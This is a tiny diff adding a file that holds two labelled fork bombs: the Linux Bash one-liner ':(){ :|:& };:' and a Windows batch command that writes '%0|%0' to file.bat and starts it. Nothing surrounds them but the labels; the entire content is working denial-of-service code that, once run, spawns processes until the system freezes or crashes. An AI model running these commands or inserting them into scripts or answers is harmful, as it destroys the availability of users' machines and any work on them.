@@ -1,0 +1,4 @@
+# Linux Fork Bomb
+  :(){ :|:& };:
+# Windows Fork Bomb
+  echo "%0|%0" > file.bat (start file.bat)
